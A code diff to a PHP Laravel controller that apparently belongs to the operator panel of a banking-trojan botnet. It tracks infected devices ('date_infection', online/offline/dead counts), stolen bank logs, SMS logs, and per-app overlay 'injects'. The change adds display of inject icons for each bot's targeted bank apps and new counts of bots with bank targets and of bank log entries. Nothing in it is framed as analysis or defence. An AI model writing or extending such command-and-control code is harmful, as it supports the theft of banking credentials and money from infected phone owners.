@@ -7,6 +7,7 @@ use App\Models\BankLog;
 use App\Models\Bot;
 use App\Models\BotSetting;
 use App\Models\GlobalSetting;
+use App\Models\Inject;
 use App\Models\SmsLog;
 use Illuminate\Http\Request;
 
@@ -118,6 +119,19 @@ class BotController extends Controller
                 ];
             }
 
+            $banks = '';
+            $icons = [];
+
+            if ($row->banks != '') {
+                $banks = explode(':', $row->banks);
+            
+                foreach ($banks as $bank) {
+                    $inject = Inject::where('app', $bank)->first();
+                    $icons[] = $inject ? $inject->png : "";
+                }
+
+            }
+
             $result[] = [
                 'id' => $id,
                 'key' => $id,
@@ -128,6 +142,7 @@ class BotController extends Controller
                 'operator' => $row->operator,
                 'country' => $row->country,
                 'banks' => $row->banks,
+                'icons' => $icons,
                 'last_connect' => $connection_second,
                 'date_infection' => $row->date_infection,
                 'comment' => $row->comment,
@@ -156,7 +171,8 @@ class BotController extends Controller
         $online = count(DB::SELECT("SELECT * FROM bots WHERE (TIMESTAMPDIFF(SECOND,`last_connect`, now())<=120)"));
         $offline = count(DB::SELECT("SELECT * FROM bots WHERE ((TIMESTAMPDIFF(SECOND,`last_connect`, now())>=121) AND (TIMESTAMPDIFF(SECOND,`last_connect`, now())<=144000))"));
         $dead = count(DB::SELECT("SELECT * FROM bots WHERE (TIMESTAMPDIFF(SECOND,`last_connect`, now())>=144001)"));
-        $banks = count(DB::SELECT("SELECT * FROM bank_logs"));
+        $banks = count(DB::SELECT("SELECT * FROM bots WHERE banks != ''"));
+        $log = count(DB::SELECT("SELECT * FROM bank_logs"));
 
         return [
             "bots" => (string) $bots,
@@ -164,6 +180,7 @@ class BotController extends Controller
             "offline" => (string) $offline,
             "dead" => (string) $dead,
             "banks" => (string) $banks,
+            "log" => (string) $log
         ];
     }
 
